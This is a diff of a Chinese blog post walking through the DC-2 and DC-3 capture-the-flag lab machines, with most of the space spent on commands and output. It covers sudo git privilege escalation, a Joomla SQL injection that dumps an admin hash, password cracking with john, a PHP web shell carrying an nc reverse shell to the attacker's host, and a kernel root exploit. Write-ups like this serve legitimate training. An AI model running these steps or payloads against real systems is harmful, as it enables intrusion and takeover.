 <p>Good to see that you’ve made it this far - but you’re not home yet. </p>
@@ -293,100 +356,583 @@ DC-1环境虚拟机平台：VMware Workstation Pro
 <p>Go on - git outta here!!!!</p>
 </blockquote>
 <p>表面上说没有提示，但是最后一句话有<code>git</code>单词，提示我们利用git提权。提权成功后，拿到了最后的flag</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo git -p help config</span></span><br><span class="line"><span class="comment"># !/bin/sh</span></span><br><span class="line"><span class="comment"># id</span></span><br><span class="line"><span class="comment"># cd ~</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line"><span class="comment"># cat final-flag.txt</span></span><br><span class="line"></span><br><span class="line">jerry@DC-2:~$ sudo git -p <span class="built_in">help</span> config</span><br><span class="line">GIT-CONFIG(1)  ...</span><br><span class="line">NAME</span><br><span class="line">       git-config - Get and <span class="built_in">set</span> repository or global options</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       git config [&lt;file-option&gt;] [<span class="built_in">type</span>] [-z|--null] name [value [value_regex]]</span><br><span class="line">       git config [&lt;file-option&gt;] [<span class="built_in">type</span>] --add name value</span><br><span class="line">       ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">       You can query/<span class="built_in">set</span>/replace/<span class="built_in">unset</span> options with this <span class="built_in">command</span>. The name is actually the section and the key separated by a dot, and the</span><br><span class="line">       ...</span><br><span class="line">       expansion (see --path below). If no <span class="built_in">type</span> specifier is passed, no checks or transformations are performed on the value.</span><br><span class="line">!/bin/sh</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"><span class="comment"># cd ~</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">final-flag.txt</span><br><span class="line"><span class="comment"># cat final-flag.txt</span></span><br><span class="line"> __    __     _ _       _                    _ </span><br><span class="line">/ / /\ \ \___| | |   __| | ___  _ __   ___  / \</span><br><span class="line">\ \/  \/ / _ \ | |  / _` |/ _ \| <span class="string">'_ \ / _ \/  /</span></span><br><span class="line"><span class="string"> \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ </span></span><br><span class="line"><span class="string">  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulatons!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">A special thanks to all those who sent me tweets</span></span><br><span class="line"><span class="string">and provided me with feedback - it'</span>s all greatly</span><br><span class="line">appreciated.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure>
+<pre><code class="bash"># sudo git -p help config
+# !/bin/sh
+# id
+# cd ~
+# ls
+# cat final-flag.txt
+
+jerry@DC-2:~$ sudo git -p help config
+GIT-CONFIG(1)  ...
+NAME
+       git-config - Get and set repository or global options
+
+SYNOPSIS
+       git config [&lt;file-option&gt;] [type] [-z|--null] name [value [value_regex]]
+       git config [&lt;file-option&gt;] [type] --add name value
+       ...
+
+
+DESCRIPTION
+       You can query/set/replace/unset options with this command. The name is actually the section and the key separated by a dot, and the
+       ...
+       expansion (see --path below). If no type specifier is passed, no checks or transformations are performed on the value.
+!/bin/sh
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cd ~
+# ls
+final-flag.txt
+# cat final-flag.txt
+ __    __     _ _       _                    _ 
+/ / /\ \ \___| | |   __| | ___  _ __   ___  / \
+\ \/  \/ / _ \ | |  / _` |/ _ \| &#39;_ \ / _ \/  /
+ \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ 
+  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   
+
+
+Congratulatons!!!
+
+A special thanks to all those who sent me tweets
+and provided me with feedback - it&#39;s all greatly
+appreciated.
+
+If you enjoyed this CTF, send me a tweet via @DCAU7.
+</code></pre>
 <h1 id="DC-3"><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h1><h2 id="环境-2"><a href="#环境-2" class="headerlink" title="环境"></a>环境</h2><p>虚拟机平台：VMware Workstation Pro</p>
 <p>攻击机：Kali（IP：192.168.43.84）</p>
 <p>靶机：DC-3（IP：192.168.43.134）</p>
 <h2 id="渗透测试-2"><a href="#渗透测试-2" class="headerlink" title="渗透测试"></a>渗透测试</h2><p><code>nmap</code>扫描靶机，发现只开启了80端口，浏览器访问</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/3-1.png" alt="3-1"></p>
 <p>利用前段时间学长给的工具<code>gwhatweb</code>，知道了网站框架是<code>Joomla(逐浪)</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># python gwhatweb.py http://192.168.43.134/</span><br><span class="line"></span><br><span class="line">root@Knlvre:~/桌面/gwhatweb-master# python gwhatweb.py http://192.168.43.134/</span><br><span class="line">webdata total:1421</span><br><span class="line">CMS:Joomla(逐浪) Judge:http://192.168.43.134/administrator/components/com_login/login.xml re:joomla</span><br><span class="line">CMS:Joomla(逐浪) Judge:http://192.168.43.134/components/com_wrapper/wrapper.xml re:joomla</span><br><span class="line">CMS:Joomla(逐浪) Judge:http://192.168.43.134/README.txt re:joomla</span><br><span class="line">CMS:Joomla(逐浪) Judge:http://192.168.43.134/plugins/authentication/joomla/joomla.xml re:joomla</span><br><span class="line">CMS:Joomla(逐浪) Judge:http://192.168.43.134/modules/mod_banners/mod_banners.xml re:joomla</span><br><span class="line">CMS:Joomla(逐浪) Judge:http://192.168.43.134/robots.txt.dist re:joomla</span><br><span class="line">cost: 4.991101 s</span><br></pre></td></tr></table></figure>
-<p>使用Joomla框架扫描工具<code>Joomblah</code>扫描网站</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># python joomblah.py http://192.168.43.134/</span><br><span class="line"></span><br><span class="line">root@Knlvre:~/桌面/exploits/Joomblah# python joomblah.py http://192.168.43.134/</span><br><span class="line">                                                                                                                    </span><br><span class="line">    .---.    .-&apos;&apos;&apos;-.        .-&apos;&apos;&apos;-.                                                           </span><br><span class="line">    |   |   &apos;   _    \     &apos;   _    \                            .---.                        </span><br><span class="line">    &apos;---&apos; /   /` &apos;.   \  /   /` &apos;.   \  __  __   ___   /|        |   |            .           </span><br><span class="line">    .---..   |     \  &apos; .   |     \  &apos; |  |/  `.&apos;   `. ||        |   |          .&apos;|           </span><br><span class="line">    |   ||   &apos;      |  &apos;|   &apos;      |  &apos;|   .-.  .-.   &apos;||        |   |         &lt;  |           </span><br><span class="line">    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           </span><br><span class="line">    |   | `.   ` ..&apos; /   `.   ` ..&apos; /  |  |  |  |  |  |||/&apos;__ &apos;. |   | .:--.&apos;.  | | .&apos;&apos;&apos;-.    </span><br><span class="line">    |   |    &apos;-...-&apos;`       &apos;-...-&apos;`   |  |  |  |  |  ||:/`  &apos;. &apos;|   |/ |   \ | | |/.&apos;&apos;&apos;. \   </span><br><span class="line">    |   |                              |  |  |  |  |  |||     | ||   |`&quot; __ | | |  /    | |   </span><br><span class="line">    |   |                              |__|  |__|  |__|||\    / &apos;|   | .&apos;.&apos;&apos;| | | |     | |   </span><br><span class="line"> __.&apos;   &apos;                                              |/&apos;..&apos; / &apos;---&apos;/ /   | |_| |     | |   </span><br><span class="line">|      &apos;                                               &apos;  `&apos;-&apos;`       \ \._,\ &apos;/| &apos;.    | &apos;.  </span><br><span class="line">|____.&apos;                                                                `--&apos;  `&quot; &apos;---&apos;   &apos;---&apos; </span><br><span class="line"></span><br><span class="line"> [-] Fetching CSRF token</span><br><span class="line"> [-] Testing SQLi</span><br><span class="line">  -  Found table: d8uea_users</span><br><span class="line">  -  Found table: users</span><br><span class="line">  -  Extracting users from d8uea_users</span><br><span class="line"> [$] Found user [&apos;629&apos;, &apos;admin&apos;, &apos;admin&apos;, &apos;freddy@norealaddress.net&apos;, &apos;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&apos;, &apos;&apos;, &apos;&apos;]</span><br><span class="line">  -  Extracting sessions from d8uea_session</span><br><span class="line">  -  Extracting users from users</span><br><span class="line">  -  Extracting sessions from session</span><br></pre></td></tr></table></figure>
-<p>得到一串<code>hash</code>密码， 用<code>john</code>工具爆破一下得到密码：snoopy</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># vi hash.txt</span><br><span class="line"># 填入$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span><br><span class="line"># john hash.txt</span><br><span class="line"></span><br><span class="line">root@Knlvre:~/桌面/Hash-Algorithm-Identifier/hashidentifier# vi hash.txt</span><br><span class="line">root@Knlvre:~/桌面/Hash-Algorithm-Identifier/hashidentifier# john hash.txt </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])</span><br><span class="line">Cost 1 (iteration count) is 1024 for all loaded hashes</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">Press &apos;q&apos; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">Almost done: Processing the remaining buffered candidate passwords, if any.</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist</span><br><span class="line">snoopy           (?)</span><br><span class="line">1g 0:00:00:02 DONE 2/3 (2019-09-23 09:06) 0.4830g/s 17.39p/s 17.39c/s 17.39C/s mustang..buster</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
-<p>Ps：第一次使用<code>john</code>，当重复爆破一个文件时，会出现以下提示</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:~# john hash.txt </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])</span><br><span class="line">No password hashes left to crack (see FAQ)	#提示</span><br></pre></td></tr></table></figure>
-<p>百度之后才知道，john不会再执行爆破过的文件，如果出现如上提示，可以加<code>--show</code>参数查看文件，就能看到破解情况</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:~# john --show hash.txt </span><br><span class="line">?:snoopy</span><br><span class="line"></span><br><span class="line">1 password hash cracked, 0 left</span><br></pre></td></tr></table></figure>
-<p><code>dirsearch</code>扫描出后台<code>/administrator/</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[09:57:08] 200 -    5KB - /administrator/</span><br><span class="line">[09:57:08] 200 -    5KB - /administrator/index.php</span><br><span class="line">[09:57:08] 301 -  329B  - /administrator/logs  -&gt;  http://192.168.43.134/administrator/logs/</span><br><span class="line">[09:57:11] 301 -  314B  - /bin  -&gt;  http://192.168.43.134/bin/</span><br><span class="line">[09:57:11] 200 -   31B  - /bin/</span><br><span class="line">[09:57:11] 301 -  316B  - /cache  -&gt;  http://192.168.43.134/cache/</span><br><span class="line">[09:57:11] 200 -   31B  - /cache/</span><br><span class="line">[09:57:12] 301 -  321B  - /components  -&gt;  http://192.168.43.134/components/</span><br><span class="line">[09:57:13] 200 -    0B  - /configuration.php</span><br><span class="line">[09:57:17] 200 -    3KB - /htaccess.txt</span><br><span class="line">[09:57:18] 301 -  317B  - /images  -&gt;  http://192.168.43.134/images/</span><br><span class="line">[09:57:18] 301 -  319B  - /includes  -&gt;  http://192.168.43.134/includes/</span><br><span class="line">[09:57:18] 200 -   31B  - /includes/</span><br><span class="line">[09:57:18] 200 -    7KB - /index.php</span><br><span class="line">[09:57:20] 301 -  319B  - /language  -&gt;  http://192.168.43.134/language/</span><br><span class="line">[09:57:20] 301 -  320B  - /libraries  -&gt;  http://192.168.43.134/libraries/</span><br><span class="line">[09:57:20] 200 -   18KB - /LICENSE.txt</span><br><span class="line">[09:57:21] 301 -  316B  - /media  -&gt;  http://192.168.43.134/media/</span><br><span class="line">[09:57:22] 301 -  318B  - /modules  -&gt;  http://192.168.43.134/modules/</span><br><span class="line">[09:57:25] 301 -  318B  - /plugins  -&gt;  http://192.168.43.134/plugins/</span><br><span class="line">[09:57:26] 200 -    4KB - /README.txt</span><br><span class="line">[09:57:27] 403 -  302B  - /server-status</span><br><span class="line">[09:57:27] 403 -  303B  - /server-status/</span><br><span class="line">[09:57:31] 200 -   31B  - /templates/</span><br><span class="line">[09:57:31] 301 -  320B  - /templates  -&gt;  http://192.168.43.134/templates/</span><br><span class="line">[09:57:32] 301 -  314B  - /tmp  -&gt;  http://192.168.43.134/tmp/</span><br><span class="line">[09:57:32] 200 -   31B  - /tmp/</span><br><span class="line">[09:57:33] 200 -    2KB - /web.config.txt</span><br></pre></td></tr></table></figure>
-<p>访问后，用admin的密码成功登陆</p>
+<pre><code># python gwhatweb.py http://192.168.43.134/
+
+root@Knlvre:~/桌面/gwhatweb-master# python gwhatweb.py http://192.168.43.134/
+webdata total:1421
+CMS:Joomla(逐浪) Judge:http://192.168.43.134/administrator/components/com_login/login.xml re:joomla
+CMS:Joomla(逐浪) Judge:http://192.168.43.134/components/com_wrapper/wrapper.xml re:joomla
+CMS:Joomla(逐浪) Judge:http://192.168.43.134/README.txt re:joomla
+CMS:Joomla(逐浪) Judge:http://192.168.43.134/plugins/authentication/joomla/joomla.xml re:joomla
+CMS:Joomla(逐浪) Judge:http://192.168.43.134/modules/mod_banners/mod_banners.xml re:joomla
+CMS:Joomla(逐浪) Judge:http://192.168.43.134/robots.txt.dist re:joomla
+cost: 4.991101 s
+</code></pre><p>使用Joomla框架扫描工具<code>Joomblah</code>扫描网站</p>
+<pre><code># python joomblah.py http://192.168.43.134/
+
+root@Knlvre:~/桌面/exploits/Joomblah# python joomblah.py http://192.168.43.134/
+
+    .---.    .-&#39;&#39;&#39;-.        .-&#39;&#39;&#39;-.                                                           
+    |   |   &#39;   _    \     &#39;   _    \                            .---.                        
+    &#39;---&#39; /   /` &#39;.   \  /   /` &#39;.   \  __  __   ___   /|        |   |            .           
+    .---..   |     \  &#39; .   |     \  &#39; |  |/  `.&#39;   `. ||        |   |          .&#39;|           
+    |   ||   &#39;      |  &#39;|   &#39;      |  &#39;|   .-.  .-.   &#39;||        |   |         &lt;  |           
+    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
+    |   | `.   ` ..&#39; /   `.   ` ..&#39; /  |  |  |  |  |  |||/&#39;__ &#39;. |   | .:--.&#39;.  | | .&#39;&#39;&#39;-.    
+    |   |    &#39;-...-&#39;`       &#39;-...-&#39;`   |  |  |  |  |  ||:/`  &#39;. &#39;|   |/ |   \ | | |/.&#39;&#39;&#39;. \   
+    |   |                              |  |  |  |  |  |||     | ||   |`&quot; __ | | |  /    | |   
+    |   |                              |__|  |__|  |__|||\    / &#39;|   | .&#39;.&#39;&#39;| | | |     | |   
+ __.&#39;   &#39;                                              |/&#39;..&#39; / &#39;---&#39;/ /   | |_| |     | |   
+|      &#39;                                               &#39;  `&#39;-&#39;`       \ \._,\ &#39;/| &#39;.    | &#39;.  
+|____.&#39;                                                                `--&#39;  `&quot; &#39;---&#39;   &#39;---&#39; 
+
+ [-] Fetching CSRF token
+ [-] Testing SQLi
+  -  Found table: d8uea_users
+  -  Found table: users
+  -  Extracting users from d8uea_users
+ [$] Found user [&#39;629&#39;, &#39;admin&#39;, &#39;admin&#39;, &#39;freddy@norealaddress.net&#39;, &#39;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&#39;, &#39;&#39;, &#39;&#39;]
+  -  Extracting sessions from d8uea_session
+  -  Extracting users from users
+  -  Extracting sessions from session
+
+</code></pre><p>得到一串<code>hash</code>密码， 用<code>john</code>工具爆破一下得到密码：snoopy</p>
+<pre><code># vi hash.txt
+# 填入$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu
+# john hash.txt
+
+root@Knlvre:~/桌面/Hash-Algorithm-Identifier/hashidentifier# vi hash.txt
+root@Knlvre:~/桌面/Hash-Algorithm-Identifier/hashidentifier# john hash.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Proceeding with single, rules:Single
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+snoopy           (?)
+1g 0:00:00:02 DONE 2/3 (2019-09-23 09:06) 0.4830g/s 17.39p/s 17.39c/s 17.39C/s mustang..buster
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+</code></pre><p>Ps：第一次使用<code>john</code>，当重复爆破一个文件时，会出现以下提示</p>
+<pre><code>root@Knlvre:~# john hash.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+No password hashes left to crack (see FAQ)    #提示
+</code></pre><p>百度之后才知道，john不会再执行爆破过的文件，如果出现如上提示，可以加<code>--show</code>参数查看文件，就能看到破解情况</p>
+<pre><code>root@Knlvre:~# john --show hash.txt 
+?:snoopy
+
+1 password hash cracked, 0 left
+</code></pre><p><code>dirsearch</code>扫描出后台<code>/administrator/</code></p>
+<pre><code>[09:57:08] 200 -    5KB - /administrator/
+[09:57:08] 200 -    5KB - /administrator/index.php
+[09:57:08] 301 -  329B  - /administrator/logs  -&gt;  http://192.168.43.134/administrator/logs/
+[09:57:11] 301 -  314B  - /bin  -&gt;  http://192.168.43.134/bin/
+[09:57:11] 200 -   31B  - /bin/
+[09:57:11] 301 -  316B  - /cache  -&gt;  http://192.168.43.134/cache/
+[09:57:11] 200 -   31B  - /cache/
+[09:57:12] 301 -  321B  - /components  -&gt;  http://192.168.43.134/components/
+[09:57:13] 200 -    0B  - /configuration.php
+[09:57:17] 200 -    3KB - /htaccess.txt
+[09:57:18] 301 -  317B  - /images  -&gt;  http://192.168.43.134/images/
+[09:57:18] 301 -  319B  - /includes  -&gt;  http://192.168.43.134/includes/
+[09:57:18] 200 -   31B  - /includes/
+[09:57:18] 200 -    7KB - /index.php
+[09:57:20] 301 -  319B  - /language  -&gt;  http://192.168.43.134/language/
+[09:57:20] 301 -  320B  - /libraries  -&gt;  http://192.168.43.134/libraries/
+[09:57:20] 200 -   18KB - /LICENSE.txt
+[09:57:21] 301 -  316B  - /media  -&gt;  http://192.168.43.134/media/
+[09:57:22] 301 -  318B  - /modules  -&gt;  http://192.168.43.134/modules/
+[09:57:25] 301 -  318B  - /plugins  -&gt;  http://192.168.43.134/plugins/
+[09:57:26] 200 -    4KB - /README.txt
+[09:57:27] 403 -  302B  - /server-status
+[09:57:27] 403 -  303B  - /server-status/
+[09:57:31] 200 -   31B  - /templates/
+[09:57:31] 301 -  320B  - /templates  -&gt;  http://192.168.43.134/templates/
+[09:57:32] 301 -  314B  - /tmp  -&gt;  http://192.168.43.134/tmp/
+[09:57:32] 200 -   31B  - /tmp/
+[09:57:33] 200 -    2KB - /web.config.txt
+</code></pre><p>访问后，用admin的密码成功登陆</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/3-2.png" alt="3-2"></p>
 <p>选择<code>Configuration -&gt; Templates -&gt; Templates -&gt; Protostar Details and Files -&gt; New File</code>，创建<code>shell.php</code></p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/3-3.png" alt="3-3"></p>
 <p>插入反弹shell命令</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(<span class="string">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.43.84 3737 &gt;/tmp/f'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.43.84 3737 &gt;/tmp/f&#39;);
+?&gt;
+</code></pre>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/3-4.png" alt="3-4"></p>
 <p>写完保存之后，我们先用<code>nc</code>监听<code>3737</code>端口</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:~# nc -lvp 3737</span><br><span class="line">listening on [any] 3737 ...</span><br></pre></td></tr></table></figure>
-<p>然后访问<code>shell.php</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.134/templates/protostar/shell.php</span><br></pre></td></tr></table></figure>
-<p>在查看终端时，就拿到了shell，但是该用户并没有什么权限，无法切换到<code>~</code>目录下，准备提权</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:~# nc -lvp 3737</span><br><span class="line">listening on [any] 3737 ...</span><br><span class="line">connect to [192.168.43.84] from DC3VM [192.168.43.134] 44292</span><br><span class="line">/bin/sh: 0: can&apos;t access tty; job control turned off</span><br><span class="line">$ whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>
-<p>查看版本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID:	Ubuntu</span><br><span class="line">Description:	Ubuntu 16.04 LTS</span><br><span class="line">Release:	16.04</span><br><span class="line">Codename:	xenial</span><br></pre></td></tr></table></figure>
-<p>使用<code>searchsploit</code>查看关键字<code>Ubuntu和16.04</code>的漏洞</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Ubuntu 16.04</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/3-5.png" alt="3-5"></p>
+<pre><code>root@Knlvre:~# nc -lvp 3737
+listening on [any] 3737 ...
+</code></pre><p>然后访问<code>shell.php</code></p>
+<pre><code>http://192.168.43.134/templates/protostar/shell.php
+</code></pre><p>在查看终端时，就拿到了shell，但是该用户并没有什么权限，无法切换到<code>~</code>目录下，准备提权</p>
+<pre><code>root@Knlvre:~# nc -lvp 3737
+listening on [any] 3737 ...
+connect to [192.168.43.84] from DC3VM [192.168.43.134] 44292
+/bin/sh: 0: can&#39;t access tty; job control turned off
+$ whoami
+www-data
+</code></pre><p>查看版本</p>
+<pre><code>$ lsb_release -a
+No LSB modules are available.
+Distributor ID:    Ubuntu
+Description:    Ubuntu 16.04 LTS
+Release:    16.04
+Codename:    xenial
+</code></pre><p>使用<code>searchsploit</code>查看关键字<code>Ubuntu和16.04</code>的漏洞</p>
+<pre><code>searchsploit Ubuntu 16.04
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/3-5.png" alt="3-5"></p>
 <p>使用<code>exploits/linux/local/39772.txt</code>，通过<code>-m</code>参数复制到当前目录下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:~# searchsploit -m exploits/linux/local/39772.txt</span><br><span class="line">  Exploit: Linux Kernel 4.4.x (Ubuntu 16.04) - &apos;double-fdput()&apos; bpf(BPF_PROG_LOAD) Privilege Escalation</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/39772</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/linux/local/39772.txt</span><br><span class="line">File Type: C source, ASCII text, with CRLF line terminators</span><br><span class="line"></span><br><span class="line">Copied to: /root/39772.txt</span><br></pre></td></tr></table></figure>
-<p>查看<code>39772.txt</code>可以看到介绍用法</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:~# tail -20 39772.txt </span><br><span class="line"></span><br><span class="line">An exploit that puts all this together is in exploit.tar. Usage:</span><br><span class="line"></span><br><span class="line">user@host:~/ebpf_mapfd_doubleput$ ./compile.sh</span><br><span class="line">user@host:~/ebpf_mapfd_doubleput$ ./doubleput</span><br><span class="line">starting writev</span><br><span class="line">woohoo, got pointer reuse</span><br><span class="line">writev returned successfully. if this worked, you&apos;ll have a root shell in &lt;=60 seconds.</span><br><span class="line">suid file detected, launching rootshell...</span><br><span class="line">we have root privs now...</span><br><span class="line">root@host:~/ebpf_mapfd_doubleput# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(vboxsf),1000(user)</span><br><span class="line"></span><br><span class="line">This exploit was tested on a Ubuntu 16.04 Desktop system.</span><br><span class="line"></span><br><span class="line">Fix: https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Proof of Concept: https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552</span><br><span class="line">Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span><br></pre></td></tr></table></figure>
